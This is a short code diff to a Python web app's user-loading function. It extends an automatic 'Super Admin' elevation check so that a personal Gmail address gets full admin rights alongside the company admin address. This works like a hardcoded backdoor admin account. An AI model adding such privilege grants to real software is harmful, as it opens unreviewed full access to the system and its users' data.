@@ -45,7 +45,7 @@ def get_current_user(
         db.refresh(user)
         
     # Auto-elevate admin account if needed
-    if email == "admin@athenaiq.com":
+    if email in ["admin@athenaiq.com", "abhinashbala301@gmail.com"]:
         super_admin_role = db.query(models.Role).filter(models.Role.role_name == "Super Admin").first()
         if super_admin_role:
             has_admin = any(ur.role_id == super_admin_role.id for ur in user.roles)
